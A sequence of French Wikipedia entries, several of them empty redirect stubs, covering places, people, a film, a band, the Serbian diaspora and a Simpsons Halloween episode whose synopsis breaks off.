<doc id="3214834" url="https://fr.wikipedia.org/wiki?curid=3214834" title="Papakura (Nouvelle-Zélande)">
Papakura (Nouvelle-Zélande)



</doc>
<doc id="3214835" url="https://fr.wikipedia.org/wiki?curid=3214835" title="Papakura">
Papakura



</doc>
<doc id="3214839" url="https://fr.wikipedia.org/wiki?curid=3214839" title="IATA Operational Safety Audit">
IATA Operational Safety Audit

IATA Operational and Safety Audit (IOSA) est la première norme mondiale pour la vérification de la sécurité des procédures d’exploitation des transporteurs aériens. Elle a été créée en 2003 par l'IATA. Le programme est conçu pour évaluer la gestion de l’exploitation et les systèmes de contrôle des compagnies aériennes. Les compagnies sont inscrites au registre IOSA pour une durée de deux ans à la suite d'un audit effectué par un organisme accrédité par l'IATA. Les normes de vérification ont été élaborées en collaboration avec différentes autorités réglementaires, telles que la Federal Aviation Administration (FAA) aux États-Unis, la Australia’s Civil Aviation Safety Authority, Transports Canada et les Autorités conjointes de l’aviation d’Europe (JAA). L’IATA supervise l’accréditation des organismes d'audit, veille au développement continu des normes et pratiques IOSA et gère la base de données des compagnies labelisées.

</doc>
<doc id="3214843" url="https://fr.wikipedia.org/wiki?curid=3214843" title="Handball aux Jeux olympiques de 2004">
Handball aux Jeux olympiques de 2004



</doc>
<doc id="3214844" url="https://fr.wikipedia.org/wiki?curid=3214844" title="Mont Saint-Romain">
Mont Saint-Romain

Le mont Saint-Romain est un sommet situé sur le territoire de la commune de Blanot en Saône-et-Loire, dans la région Bourgogne-Franche-Comté du sud. 
Culminant à 579 mètres d'altitude, il fait partie des monts du Mâconnais, avec une vue à l'ouest sur le Clunisois et, à l'est, sur le Haut-Mâconnais (et, par-delà, sur le val de Saône et la Bresse, avec les monts du Jura et les Alpes en toile de fond). 
Le lieu dispose d'une table d'orientation « érigée par le Touring-club de France » en 1948, tandis que les grottes de Blanot s'ouvrent à son pied sud-ouest.
Ce sommet des monts du Mâconnais est environné d'une importante forêt domaniale appartenant au domaine privé de l’État, répartie sur le territoire de quatre communes : la forêt des Grisons (superficie totale : ), mêlant feuillus et conifères.
Un lieu de dévotion.
L'habitude prise d'allumer un grand feu au sommet du mont Saint-Romain laisse penser que celui-ci est un ancien lieu de culte druidique. La légende, de plus, évoque une lutte sans merci entre l’ancienne et la nouvelle religion sur ce site boisé et rocheux.
L'oratoire édifié au sommet a été cédé à l'abbaye de Cluny en 927, le cartulaire de l'abbaye mentionnant l'acquisition de l’« ecclesia sancti romani ». Dans la première moitié du , le lieu devient assez fréquenté ; l’abbé Pierre le Vénérable vient s’y reposer à plusieurs reprises. 
L’ancienne chapelle du mont Saint-Romain abrite ensuite un collège de deux à trois moines, jusqu’à ce qu’elle soit finalement réduite, au sortir du Moyen Âge, à n'être plus qu'une simple chapelle, qui sera le lieu d'un ermitage au . Cet ermitage – dont il ne subsiste rien – est vendu nationalement le .
Sur le flanc nord-est du mont Saint-Romain, non loin de l'ancienne chapelle, la « fontaine du Plâtre », source captée qui coule en bordure de la route menant au mont, fut longtemps l'objet d'un pèlerinage, qui dura jusqu'à la fin du . Celui-ci se déroulait de nuit et on y venait notamment pour la guérison des fièvres. Les pèlerins se lavaient les yeux, buvaient l'eau, puis plaçaient dans les interstices des pierres du bassin des pièces de monnaie. On prétendait que l'eau sortait du corps de saint Romain inhumé non loin de là, sous une croix (qui a disparu).

</doc>
<doc id="3214846" url="https://fr.wikipedia.org/wiki?curid=3214846" title="Andrey Amador">
Andrey Amador

Andrey Amador Bikkazakova, né le à San José, est un coureur cycliste costaricien. Professionnel de 2009 à 2024, il remporte une étape du Tour d'Italie 2012. Il termine quatrième du Tour d'Italie 2015 et est porteur du maillot rose lors de l'édition suivante.
Biographie.
Il a un frère aîné, Iván, qui lui, cependant, n'a jamais roulé au niveau professionnel.
Andrey Amador rejoint la Caisse d'Épargne en 2009. Début 2011, il est victime d'une agression par plusieurs délinquants alors qu'il s’entraîne. Alors qu'il pense s'en être sorti, les malfaiteurs le retrouvent et le rouent de coup. Il manquera le début de saison, le temps de se remettre de ses blessures. En avril, il est quatrième du GP Llodio et du Tour de La Rioja, puis se blesse lors du Tour des Asturies, ce qui l'empêche de participer au Tour d'Italie le mois suivant. En juillet, il devient le premier coureur du Costa Rica à participer au Tour de France ce qui lui vaut d'être reçu par la présidente Laura Chinchilla à son retour au pays après la course. Blessé à la cheville à cause d'une chute lors de la première semaine de ce Tour, il parvient au terme de celui-ci, à l'avant-dernière place.
Il remporte sa première victoire professionnelle lors du "Giro" 2012, où il s’adjuge la au sommet de Cervinia, deux jours après sa troisième place à Sestri Levante derrière Sandy Casar et Lars Ytting Bak. En juillet, il est quatrième de la Prueba Villafranca de Ordizia, puis représente le Costa Rica lors de la course en ligne des Jeux olympiques de Londres, dont il prend la . En septembre, il est sixième du premier championnat du monde du contre-la-montre par équipes de marques, avec Movistar. Il dispute ensuite le championnat du monde sur route, qu'il termine à la . En fin de saison, il chute dans les derniers kilomètres du Tour du Piémont et se fracture alors un radius, un métacarpien et se luxe un doigt.
Il confirme ses bonnes performances de 2012, dès le début de la saison suivante en terminant à la huitième place du classement général de Tirreno-Adriatico, grâce notamment à une place de troisième sur le contre-la-montre de l'ultime étape à San Benedetto Del Tronto. Cette même année, il est pour la première fois parmi les dix premiers d'une flandrienne en terminant de Gand-Wevelgem. Il se fracture la clavicule droite en tombant lors de Liège-Bastogne-Liège en avril. De retour au Tour de Suisse en juin, il est cinquième de l'étape contre-la-montre et dix-septième du classement général. Il dispute le Tour de France en tant qu'équipier de Nairo Quintana, deuxième du classement général. De retour en compétition fin août, il n'est pas au niveau espéré. Un examen réalisé en octobre révèle une mononucléose, susceptible d'expliquer cette baisse de régime. Aux championnats du monde à Florence, il est dixième du contre-la-montre par équipe avec Movistar et représente le Costa Rica lors de la course en ligne.
En 2014, Amador est à nouveau aux avant-postes lors de Gand-Wevelgem, où il est échappé dans les vingt derniers kilomètres avec Stijn Devolder et Silvan Dillier, et rattrapé dans le dernier kilomètre. Il aide Quintana à remporter le Tour d'Italie. Durant l'été, il termine sixième du Tour de Pologne puis prend le départ du Tour d'Espagne, en tant qu'équipier d'Alejandro Valverde et Nairo Quintana. Avec ses coéquipiers, il gagne la première étape, un contre-la-montre par équipes. Il termine sa saison aux championnats du monde à Ponferrada. Avec Movistar, il est sixième du contre-la-montre par équipe. Il prend la de la course en ligne.
Il participe au Tour d'Italie 2015. Tout au long de la course, il impressionne, notamment dans la montagne, en suivant les meilleurs coureurs comme Alberto Contador et Fabio Aru, et termine la course en quatrième position. Ce résultat est historique pour le cyclisme costaricien et d'Amérique centrale.
À l'issue de la treizième étape du Tour d'Italie 2016, il prend le maillot rose et devient le premier cycliste costaricien et d'Amérique centrale à porter le maillot de leader d'un grand tour. Il se classe finalement huitième de la course.
En 2019, alors qu'il devait prolonger son contrat avec Movistar jusqu'en 2021, il change d'avis et veut rejoindre Ineos pour suivre son coéquipier Richard Carapaz. Le 11 février 2020, il annonce avoir trouvé un accord pour rompre son contrat à l'amiable avec Movistar et s'engager avec Ineos.
Il rejoint EF-Education Easy-Post pour la saison 2023, avant de prendre sa retraite en fin d'année suivante.
Palmarès et classements mondiaux.
Résultats sur les grands tours.
Tour de France.
7 participations
Tour d'Italie.
7 participations
Tour d'Espagne.
4 participations

</doc>
<doc id="3214849" url="https://fr.wikipedia.org/wiki?curid=3214849" title="Société centrale d'architecture de Belgique">
Société centrale d'architecture de Belgique

La Société centrale d'architecture de Belgique est une des trois plus anciennes sociétés consacrée à l'architecture en Belgique. Cette société créée en 1872 encourageait la reconnaissance du métier d’architecte à l’époque où l’évolution technique amenait la multiplication d’intervenants dans les constructions.
Histoire.
Après que les architectes de Bruxelles ont fondé la Société Palladio en 1842, que ceux d'Anvers ont créé dès 1848 leur société (KMBA), inspirés par l'exemple des Académies de la Renaissance italienne et que ceux de Liège ont fondé la leur en 1875 (Société des jeunes architectes de Liège), les architectes bruxellois, après la disparition de la Société Palladio, décidèrent d'en créer une nouvelle, le , en lui donnant une compétence nationale de sorte qu'elle se considère comme la première Société d'Architecture belge.
Elle joua un grand rôle lors de l'efflorescence de l'Art nouveau et grâce à la publication de sa revue "L'Émulation".
Les Horta, Beyaert, Schoy, van Dievoet, Soubre, Octave Carpet et tant d'autres en ont fait partie.
Après cette époque glorieuse, elle se fit plus discrète. Elle est dissoute en 2010.
Elle n'en possédait pas moins des archives très importantes et précieuses.

</doc>
<doc id="3214850" url="https://fr.wikipedia.org/wiki?curid=3214850" title="Robert Michael Doornbos">
Robert Michael Doornbos



</doc>
<doc id="3214851" url="https://fr.wikipedia.org/wiki?curid=3214851" title="Fernando Alonso Díaz">
Fernando Alonso Díaz



</doc>
<doc id="3214856" url="https://fr.wikipedia.org/wiki?curid=3214856" title="Canon anti-aérien">
Canon anti-aérien



</doc>
<doc id="3214858" url="https://fr.wikipedia.org/wiki?curid=3214858" title="Laurent etienne">
Laurent etienne



</doc>
<doc id="3214861" url="https://fr.wikipedia.org/wiki?curid=3214861" title="Monsieur Destinée">
Monsieur Destinée

Monsieur Destinée, ou Monsieur Destin au Québec ("Mr. Destiny") est un film américain réalisé par en 1990.
Synopsis.
Le jour de ses 35 ans, Larry Joseph Burrows, un homme dont la vie est terne et sans goût, décide d'aller boire un verre et de raconter ses déboires au barman en attendant l'arrivée d'une dépanneuse. Il aurait pu devenir un grand champion de baseball s'il n'avait pas cligné des yeux au moment de recevoir la balle vingt ans plus tôt. Cet incident lui a permis toutefois de rencontrer Ellen Jane, venue le réconforter et qui va devenir son épouse. Larry raconte aussi qu'il a passé une très mauvaise journée parce qu'il n'a pas eu son petit déjeuner préféré, son café, son cadeau d'anniversaire, sa promotion. Pour cause, il s'est fait renvoyer par son chef de service Niles Pender, après avoir découvert ses intentions malhonnêtes et son entrepreneur qui a réussi à lui soutirer de l'argent pour lui cimenter son allée. Le barman, compatissant, lui sert un cocktail magique qui permet à Larry de voyager dans le temps et de, cette fois-ci, réussir son match de baseball.
Larry croit d'abord à une plaisanterie jusqu'à ce que le propriétaire de sa maison le jette dehors. Il découvre alors qu'il est président de sa société, propriétaire d'une demeure de luxe et marié à Cindy Jo avec laquelle il a deux enfants.
Après un anniversaire de rêve où tous les membres de la haute société sont présents, Larry s'aperçoit que sa nouvelle vie ne comporte pas que des avantages. Il découvre que Clip, son meilleur ami est un homme suicidaire, qu'Ellen Jane, déléguée syndicale, lui voue une haine féroce, qu'il a une maîtresse, Jewel, et que son père, Harry, fréquente des femmes bien plus jeunes que lui. Se rendant compte que sa nouvelle vie est une catastrophe, Larry est soupçonné du meurtre de Léo Hansen, ancien propriétaire de son entreprise alors que le véritable meurtrier est Niles. Devant également échapper à Jewel, Larry prend la fuite après avoir presque réussi à convaincre Ellen Jane qu'elle a été sa femme dans une autre vie. 
Il retrouve finalement son ancienne vie, réussit à faire renvoyer Niles et apprend, lors de sa soirée d'anniversaire surprise, qu'il va devenir vice-président. 
Le film se finit avec le barman sur les gradins du stade de baseball disant au jeune Larry que les choses vont changer plus tard et qu'il ne doit plus s'inquiéter.
Autour du film.
Plusieurs scènes du film furent tournées à Winston-Salem (Caroline du Nord) avec la contribution de l'équipe locale de baseball de l'école Richard J. Reynolds.
Le bâtiment de la société est l'ancien siège de la RJ Reynolds Tobacco Company.
Le nom de jeune fille du personnage interprété par Linda Hamilton est Ellen Ripley. C'est également le nom du personnage interprété par Sigourney Weaver dans "Alien" (1979) et Aliens, le retour (1986), un film dont le réalisateur James Cameron avait déjà dirigé Linda Hamilton dans "Terminator" (1984) et deviendra quelques années plus tard son époux.
Lorsqu'ils dînent à la pizzeria, Larry (James Belushi) demande à Ellen de lui poser des questions afin de lui prouver qu'ils étaient bien mariés dans son autre vie. Restant néanmoins dubitative, Larry lui demande de lui poser une vraie colle. Ellen lui demande alors quelle chanson passait à la radio lorsqu'elle avait été arrêtée pour excès de vitesse. Larry répond en programmant la chanson sur le juke-box de la pizzeria. Il s'agit de « "Gimme Some Lovin’" » interprétée par The Spencer Davis Group. John Belushi, le frère de l'acteur, interprète lui-même cette chanson dans "The Blues Brothers" (1980).
James Belushi est le seul acteur avec lequel Michael Caine parle dans le film (sauf la scène avec le policier qui vit dans l'ancienne demeure de Larry et celle où le dépanneur intervient, mais les deux personnages cités n'échangent aucun mot avec Mike).
La date de naissance de Larry est le , sachant qu'il fête ses 35 ans en 1990. Celle de James Belushi est le .
Jackie, le président et mari de Cindy-Jo dans la vraie vie, est complètement absent de la vie alternative de Larry. On peut supposer qu'il a préféré continuer sa carrière dans le football, puisqu'il exerçait un métier sportif avant de rencontrer Cindy-Jo.
C'est le second film dans lequel Jacques Frantz assure la VF de James Belushi après "Filofax", et avant "Traces de sang" et "Super papa".
Les deux principaux acteurs du film se retrouvent dans Présumée Coupable puis dans un épisode de la série According to Jim. Là encore, ils interprètent deux personnages en couple.
Le script original du film comporte de nombreuses différences :
- La partie dans laquelle Larry a son accident de voiture au début n'est pas incluse.
- Le coach de Larry et Larry lui-même délivrent quelques lignes de dialogues supplémentaires.
- La narration est entrecoupée par un court passage de Larry travaillant dans son garage. Nous faisons aussi la connaissance de son chien, Sammy.
- Le père d'Ellen présente sa fille à Larry.
- Lorsque nous voyons Ellen et Larry parler en tant qu'adultes, de la narration a été rajoutée ainsi qu'un speech de Larry à propos de James Dean.
- Larry rencontre Monsieur Destinée à deux occasions avant son entrée dans le bar. Dans la première, il est représenté sous la forme d'un policier. Dans la seconde, sous celle d'un agent de sécurité.

</doc>
<doc id="3214865" url="https://fr.wikipedia.org/wiki?curid=3214865" title="Karamelo Santo">
Karamelo Santo

Karamelo Santo est un groupe de rock fusion argentin, originaire de Mendoza. Formé par Goy Karamelo, pionniers de styles musicaux tels que le punk rock, folk, cumbia, ska et reggae en Amérique latine, le groupe se met officiellement en route en 1993. Il est le précurseur du rock dit mestizo ou alterlatino.
Biographie.
Débuts (1992-1999).
Au printemps 1992, Goy Karamelo, Fabiana Droghei et Mario Yarke constituent la première formation de Karamelo Santo et, après un mois de répétitions, débutent avec succès au pub La Torre de la ville de Mendoza, le . Pour la première fois, un style musical nouveau (le rock mestizo ; plus tard alterlatino) apparait à Mendoza.
Ils enregistrent indépendamment leur premier album, "La Kulebra", au studio local Bunker Records, dont le style est orienté rock fusion issu d'éléments de pasodoble, boléro, cumbia, punk rock, ska et murga. Le chanteur et producteur David Byrne, ex-leader du groupe Talking Heads, félicitera personnellement le groupe pour l'originalité de cet album. Le compositeur argentin Gustavo Santaolalla, révèle aussi son admiration pour leur concert. Par la suite, le groupe décide de se délocaliser à Buenos Aires.
Entre mars 1997 et 2010, les membres vivent ensemble dans le quartier de La Boca à Buenos Aires, dans une maison-atelier. Cette année-là, ils sortent leur deuxième album, "Perfectos idiotas", produit par les membres de Todos Tus Muertos. Entretemps, leur premier clip, "Vas a volver", est diffusé sur MTV, et le single atteint la première place de plusieurs chaines de radio argentines et latino-américaines au cours de l'été 1998. Désormais, le groupe participe aux principaux festivals nationaux tels que le Cosquín Rock, Gesell Rock, Quilmes Rock, et Pepsi Music.
Années 2000 et tournées internationales.
Durant les années 2000, le groupe part en tournée pour l'Argentine, le Chili, la Colombie et l'Uruguay. Ils jouent aussi aux États-Unis et au Mexique, choisi comme groupe préféré de Manu Chao lors de ses tournées à travers l'Amérique du Sud. En 2002, ils sortent leur troisième album, "Los Guachos", qui est produit par Manu Chao, Tonino Carotone, Gambeat, Fernando Barrientos et Chico Ocaña de Mártires del Compás. Cette année-là, ils jouent en Europe, devenant célèbres sur le continent.
En 2003, ils effectuent la tournée européenne la plus importante jamais réalisé dans l'histoire du rock latino-américain, avec 120 concerts à travers le continent pendant trois mois et demi. À partir de cette année, ils répètent consécutivement les tournées européennes, jouant dans les principaux festivals de rock du monde tels que le Roskilde (Danemark), Festival de Montreux (Suisse), Paléo (Suisse), Hurricane (Allemagne), Southside Festival (Allemagne), Greenfield (Suisse), Festival de Gurten (Suisse), Rock for People (République tchèque), Mistic Sounds (République tchèque), Prestenize (République tchèque), Fusion Fest (Allemagne), Viña Rock (Espagne), Rio Loco (France), Balaton (Hongrie), Pole Pole (Suisse) et Hodovskas (Slovaquie).
En 2004, ils sortent "Haciendo Bulla", produit par Alfredo Toth, en Europe, au Mexique et aux États-Unis, dont le succès est remarquable. Les singles qui en découlent sont "Tu pa 'mi", "Los Cangrejos" et "Vivo en una isla". En 2006, ils publient "La Gente Arriba", dont les chansons incluent le morceau homonyme, plus "Mi Plantita Chiquita", "Hay un diablo", "A tu casa no voy" et "Pon la gente arriba". En 2007, ils sortent "Antena Pachamama", qui fait participer Fermin Muguruza, Les Babacools, Irie Révoltés, Orozco - Barrientos. Le morceau "Guerrillero" est utilisé comme le rideau musical pour la radio colombienne officielle des FARC.
Le , Goy est nommé ambassadeur culturel de Mendoza avec la chanteuse Mercedes Sosa, par décret du gouverneur de l'époque, Celso Jaque. La même nuit, ils jouent devant à l'amphithéâtre Frank Romero Day.
À la suite des crises sociales et économiques successives survenues en Argentine, ils gagnent la reconnaissance du public pour avoir soutenu les organisations militant pour les droits de l'Homme telles que Barrios de Pie, Hijos de Desaparecidos, Fundación COOR, Cooperanza, Conciencia Solidaria, et Corriente del Pueblo (Jujuy). En 2009, ils sortent leur premier DVD live à l'international, enregistré au Teatro de La Plata et font leur neuvième tournée européenne consécutive.
Départ et retour de Goy (depuis 2010).
À la fin septembre 2010, Goy Karamelo (voix et guitare), annonce son départ momentané du groupe pour des raisons personnelles et des différences avec son label, faisant face à une carrière parallèle en tant que soliste et producteur. Goy Karamelo lance avec succès en mai 2012 son premier album solo. En 2014, Goy enregistre un hommage paradigmatique au folklore Cuyo.
En 2016, il revient au sein Karamelo Santo, avec Marcelo Amuchastegui et Mario Yarke (membres fondateurs).

</doc>
<doc id="3214866" url="https://fr.wikipedia.org/wiki?curid=3214866" title="La Famillia">
La Famillia



</doc>
<doc id="3214869" url="https://fr.wikipedia.org/wiki?curid=3214869" title="Laurent Etienne">
Laurent Etienne



</doc>
<doc id="3214879" url="https://fr.wikipedia.org/wiki?curid=3214879" title="Diaspora serbe">
Diaspora serbe

L'expression diaspora serbe peut désigner :
Histoire.
"Historiquement", l'aire de répartition des Serbes dans les pays anciennement yougoslaves remonte au et a constamment varié dans le temps, au fil des conquêtes et des occupations des royaumes slaves locaux et des Empires voisins (byzantin, turc, autrichien…) qui ont tantôt chassé et persécuté, tantôt fait venir et installé des populations serbes selon leurs intérêts (par exemple dans les kraïnas et les banats serbes de Hongrie médiévale ou dans les Confins militaires autrichiens pour garder la frontière avec l'Empire ottoman). 
"Démographiquement", on distingue communément cinq vagues d'émigration :
Les Serbes en Serbie et dans la diaspora.
En 2020, le gouvernement de Belgrade a déclaré que la diaspora serbe atteignait de personnes dont historiquement installés dans les pays ex-yougoslaves, et émigrés hors de ceux-ci. La Serbie a évalué précisément sa diaspora grâce au renouvellement des pièces d'identité ("lična karta") lors mise en place de la carte d'identité biométrique au format « carte de crédit » selon les normes UE et US. La diaspora serbe, tant historique que démographique, est proportionnellement la plus importante d'Europe : en effet environ 40 % des Serbes vivent hors de Serbie. 
Europe:
Amériques:
Océanie/Afrique:
Asie:
L'impact économique de la diaspora.
En 2005, la diaspora serbe investit en Serbie, via des transferts, de dollars et de $ en 2009. Entre 2000 et 2010, la Diaspora a investi ou dépensé de $ en Serbie.
Classement par investissements de quelques pays de la diaspora serbe : 

</doc>
<doc id="3214882" url="https://fr.wikipedia.org/wiki?curid=3214882" title="Église Saint-Martin-Saint-Laurent d'Orsay">
Église Saint-Martin-Saint-Laurent d'Orsay

L'église Saint-Martin-Saint-Laurent est une église paroissiale de culte catholique, dédiée à l'apôtre des Gaules, saint Martin et au martyr saint Laurent, située dans la commune française d'Orsay et le département de l'Essonne.
Situation.
L'église Saint-Martin-Saint-Laurent est implantée en centre-ville d'Orsay, face à l'hôtel-de-ville et à l'hôpital, en bordure de la route départementale 446, sur la rive droite de la rivière l'Yvette.
Historique.
La paroisse, fondée au , fut octroyée aux moines de l'abbaye Notre-Dame de Longpont. Ils construisirent en 1151 un prieuré.
À la place, en 1200 furent élevés la nef, le chœur et le clocher dans un style gothique. Durant les guerres de Religion, l'église fut pillée en 1591. La nef fut incendiée en 1652 par les soldats lors de la Fronde. En 1656, elle fut reconstruite dans un style néoroman.
En 1776, Pierre Gaspard Marie Grimod d'Orsay fit reconstruire la façade dans un style néoclassique imitant les temples grecs et romains et une chapelle sépulcrale pour son épouse. Au , de part et d'autre de la nef furent élevés quatre chapelles et un baptistère, la chapelle de la Vierge en 1843, la chapelle Sainte-Marthe en 1865, la chapelle du Sacré-Cœur et la chapelle Saint-Joseph en 1894. Fut aussi installé en 1840 un orgue. En 1890, le peintre Charles-Henri Michel participa à la décoration de l'église.
Le , les cloches furent inscrites aux monuments historiques. En 1988 fut ajouté un nouvel orgue.
Description.
L'église mélange différents styles architecturaux. Le chœur placé entre les piliers de soutien du clocher est bâti dans un style gothique, la nef fut reconstruite dans un style néoroman, la façade élevée au dans un style néoclassique et les chapelles collatérales ainsi que le baptistère ont été construits dans un style troubadour, enfin, l'orgue et les fresques datent de la deuxième moitié du .
La façade est orientée plein ouest, la nef est couverte par une voûte en berceau, au nord se trouve le baptistère avec les fonts baptismaux et une pietà, suivis par les chapelles dédiées au Sacré-Cœur et à saint Joseph. Au sud, les deux chapelles sont dédiées, l'une à la Vierge et l'autre à sainte Marthe. Trois statues représentent saint Martin, saint Laurent et saint Fiacre.
Seules les cloches en bronze datant de 1562 et 1757 sont classées aux monuments historiques au titre des objets depuis le .

</doc>
<doc id="3214883" url="https://fr.wikipedia.org/wiki?curid=3214883" title="Carmen Alborch">
Carmen Alborch

Carmen Alborch Bataller, née le à Castelló de Rugat et morte le à Valence, est une femme politique espagnole membre du Parti socialiste ouvrier espagnol (PSOE). Elle est ministre de la Culture entre 1993 et 1996.
Biographie.
Parcours universitaire.
Carmen Alborch obtient une licence de droit à l'université de Valence en 1970, et un doctorat trois ans plus tard, reçu avec un prix extraordinaire. Elle y est disciple et collègue de Manuel Broseta. Elle devient ensuite professeur de droit commercial, puis doyenne de la faculté de droit en 1984.
Administratrice culturelle.
Le , Carmen Alborch est nommée directrice générale de la Culture du département de la Culture, de l'Éducation et de la Science de la Généralité valencienne, sous l'autorité de Ciprià Ciscar. Elle est relevée de ses fonctions dès le , pour prendre le poste de directrice générale des Instituts culturels.
Elle quitte la haute fonction publique régionale le .
Passage à la vie politique.
Carmen Alborch devient ministre de la Culture d'Espagne le , lors de la formation du quatrième gouvernement de Felipe González. Au même titre que cinq autres ministres, elle n'appartient pas au PSOE.
Pour les élections législatives anticipées du 3 mars 1996, elle est investie en deuxième position sur la liste socialiste dans la province de Valence, derrière Ciprià Ciscar. Elle est alors élue au Congrès des députés, où elle devient présidente de la commission de contrôle parlementaire de la Radio Televisión Española et membre de la commission du Règlement.
Réélue aux élections du 12 mars 2000, elle est reconduite à la présidence de la commission sur les médias publics et rejoint parallèlement la commission de la Coopération internationale pour le développement. Au mois de septembre suivant, après le congrès fédéral qui voit l'élection de José Luis Rodríguez Zapatero au poste de secrétaire général, elle décide d'adhérer au Parti socialiste ouvrier espagnol.
Elle est investie en tête de liste pour les élections législatives du 14 mars 2004 dans la province de Valence, étant la première femme à mener la liste d'un grand parti dans cette circonscription. Après le scrutin, remporté par le PSOE, elle est élue présidente de la commission bicamérale des Droits des femmes et de l'Égalité des chances, tout en siégeant à la commission de l'Environnement, et à la commission de contrôle parlementaire de la Radio Televisión Española jusqu'en 2007.
Municipales de 2007 à Valence.
En , Carmen Alborch est officiellement investie tête de liste du Parti socialiste du Pays valencien-PSOE (PSPV-PSOE) aux élections municipales à Valence. Sa liste remporte , soit 33,78 % des suffrages exprimés et 12 conseillers sur 33 ; elle accuse ainsi un retard de et 9 élus sur la liste du Parti populaire de la Communauté valencienne (PPCV) de la maire sortante Rita Barberá. À l'ouverture de la mandature, elle est nommée porte-parole du groupe socialiste.
Sénatrice.
Pour les élections législatives du 9 mars 2008, Carmen Alborch se présente au Sénat. Le jour du scrutin, elle récolte , réalisant le quatrième meilleur score et remportant donc un siège, le seul obtenu par les socialistes. À l'ouverture de la législature, elle est désignée première secrétaire du bureau du Sénat et membre de la commission du Règlement.
Elle ne se représente pas aux élections municipales de , elle remporte un nouveau mandat sénatorial lors des élections législatives anticipées du 20 novembre suivant, mais avec seulement en sa faveur. Elle devient alors troisième secrétaire du bureau du Sénat et deuxième secrétaire de la députation permanente.

</doc>
<doc id="3214905" url="https://fr.wikipedia.org/wiki?curid=3214905" title="Snežnik">
Snežnik

Le Snežnik, en , en italien "", en latin , littéralement en français « pic blanc » ou « montagne blanche », est une montagne située en Slovénie dans la partie septentrionale des Alpes dinariques. Avec d'altitude, elle constitue le point culminant du plateau du Karst.
Géographie.
La montagne culmine à d'altitude. Elle se situe à environ cinq kilomètres à l'ouest de la frontière entre la Croatie et la Slovénie, sur le territoire de la municipalité de Ilirska Bistrica.
La montagne, qui fait partie du réseau Natura 2000, appartient au massif des Alpes dinariques. Les forêts entourant la montagne abritent des ours bruns. En 2006, la population en ours bruns dans la région est estimée entre 500 et 700. Certains de ceux-ci ont été réintroduits dans les Pyrénées.
La région est reconnue pour ses phénomènes karstiques et dispose d'une faune et d'une flore particulières adaptées à ce genre de biotope. C'est ainsi qu'on trouve dans des grottes de la région le protée anguillard. Il s'agit également de la seule région de Slovénie où l'on peut trouver la plante dénommée . On y trouve également la rare .
À proximité de la montagne se trouve le château de Snežnik dont la construction actuelle remonte à 1462.

</doc>
<doc id="3214908" url="https://fr.wikipedia.org/wiki?curid=3214908" title="Rocher de Monaco">
Rocher de Monaco



</doc>
<doc id="3214915" url="https://fr.wikipedia.org/wiki?curid=3214915" title="Will McBride">
Will McBride

Will McBride (né le à Saint-Louis et mort le à Berlin) est un photographe de reportage et d'art américain. Il est aussi illustrateur, peintre et sculpteur.
Biographie.
Ayant grandi à Chicago, il fait ses études à l'Université du Vermont puis à l'Art Institute of Chicago. Il est finalement diplômé à l'Université de Syracuse en 1953 avant de partir faire son service militaire en Allemagne jusqu'en 1955.
Il s'installe alors définitivement comme photographe en Allemagne. Son œuvre photographique se concentre essentiellement sur la nudité masculine en majorité d'adolescents ; ce qui lui vaudra parfois d'être censuré dans certains pays notamment en 1975 pour son livre "Show Me !" (Zeig Mal !), livre photographique pédagogique sur la sexualité.
« Je suis engagé dans la vie qui m'entoure de toutes parts et je fais des photos. Plus je me sens engagé, meilleures sont mes photos. » dit Will McBride.

</doc>
<doc id="3214919" url="https://fr.wikipedia.org/wiki?curid=3214919" title="Vincent Parizot">
Vincent Parizot

Vincent Parizot, né le à Orléans (Loiret), est un journaliste et animateur de radio français.
Après avoir travaillé vingt et un ans à Europe 1, notamment à la présentation des journaux du matin, il rejoint RTL en 2007 pour animer "RTL soir", puis la matinale un an plus tard. De 2012 à 2017, il coprésente "RTL Midi". Puis de à , il présente "Le Journal Inattendu" le samedi de à . Depuis il présente RTL Soir Week-End les samedis et dimanches.
Biographie.
Fils d’une pharmacienne et d'un chercheur, Vincent Parizot fait ses premiers pas en radio sur Orléans FM à l'âge de 18 ans.
Diplômé de l'Institut de journalisme Bordeaux Aquitaine, il décroche le Prix Lauga en 1986, une compétition organisée par Europe 1 pour recruter ses équipes, et gagne un contrat de trois mois. Il y travaillera pendant vingt et un ans. D'abord reporter, il se met à co-présenter "Europe Midi", le journal de la mi-journée, au début des années 90. Ensuite, il passe dix ans à présenter les journaux du matin. En 2002, il prend les commandes d"'Europe Soir", et en , il présente le journal de .
En , il rejoint la radio concurrente RTL pour animer "RTL soir" entre et . En , il prend les commandes de la matinale de la station du lundi au vendredi entre et . À la rentrée 2012, il est remplacé par Laurent Bazin à cause des audiences en baisse, et récupère la présentation de "RTL Midi" à aux côtés d'Elizabeth Martichoux. En il quitte "RTL Midi" pour "Le Journal Inattendu" le samedi de à . En il en cède la place à Ophélie Meunier.
Depuis , il présente "RTL Soir Week-End" les samedis et dimanches.
Depuis la rentrée de septembre 2023 , il anime "Les auditeurs ont la parole" le vendredi.
Vol en apesanteur.
Le mardi , Vincent Parizot, accompagné d'une journaliste de RTL (Anne Le Hénaff), d'un autre présentateur de RTL (Vincent Perrot), ainsi qu'une auditrice de la station, ont participé à un vol d'essai dans l'espace en impesanteur, une première mondiale. Il s'agissait d'un vol parabolique réalisé par le CNES à l'occasion du du salon aéronautique du Bourget avec l'avion Airbus A300 ZERO-G.
Vie privée.
Vincent Parizot est le père de deux enfants

</doc>
<doc id="3214925" url="https://fr.wikipedia.org/wiki?curid=3214925" title="Simpson Horror Show XIX">
Simpson Horror Show XIX

Le ou le Spécial d’Halloween (au Québec) ("") est le de la saison 20 de la série télévisée d'animation "Les Simpson".
Synopsis.
Introduction.
Cet épisode spécial Halloween se déroule le , jour de l'élection présidentielle américaine. Homer se rend compte que son vote pour Barack Obama est transformé en vote pour John McCain par la machine à voter, malgré ses tentatives répétées. Cette partie, qui a circulé sur Internet plusieurs jours avant sa diffusion télévisée le , soit deux jours avant l'élection présidentielle, a déclenché la critique de républicains qui l'ont jugée injuste.
Al Jean, un des auteurs des "Simpson", explique dans une interview que ce passage est « surtout un commentaire sur ce que beaucoup de gens pensent être des irrégularités dans notre système de vote » ("It’s mostly a comment on what many people to believe to be the irregularities in our voting system"), une critique du vote électronique.
Parodie robot sans titre (« Untitled Robot Parody »).
Bart offre comme cadeau de Noël à Lisa la voiture de sa poupée Malibu Stacy, qui est en fait un Transformers qui va transformer tous les appareils, machines et voitures de Springfield en Transformers. Ceux-ci, après s'être battus entre eux, décident finalement d'asservir l'espèce humaine et utilisent les habitants de Springfield comme joueurs d'un baby-foot géant.
Comment réussir dans la tue-blicité (« How to Get Ahead in Dead-Vertising »).
